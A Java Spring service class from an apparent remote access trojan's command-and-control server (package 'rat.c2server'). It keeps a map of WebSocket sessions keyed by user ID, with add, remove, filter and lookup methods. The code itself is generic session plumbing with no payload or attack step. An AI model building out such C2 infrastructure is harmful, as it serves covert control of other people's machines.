package devs.alex.sah.rat.c2server.services.impl;

import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
import devs.alex.sah.rat.c2server.utils.Utils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.WebSocketSession;

import java.util.HashMap;
import java.util.Map;

@Slf4j
@Service
public class UserWebSocketSessionService implements WebSocketSessionService {

    Map<String, WebSocketSession> activeUsersSessions = new HashMap<>();

    @Override
    public void addSession(WebSocketSession session) {
        activeUsersSessions.put((String)session.getAttributes().get("userId"), session);
        log.debug("Added new session {}", session);
    }

    @Override
    public void removeSession(WebSocketSession session) {
        if(! activeUsersSessions.remove((String)session.getAttributes().get("userId"),session)){
            log.error("Failed to close session {}", session);
        }
    }

    @Override
    public Map<String, WebSocketSession> getSessions(HashMap<String, Object> filters) {
        return Utils.filter(filters, activeUsersSessions);
    }

    @Override
    public WebSocketSession getSession(String key) {
        return activeUsersSessions.get(key);
    }
}
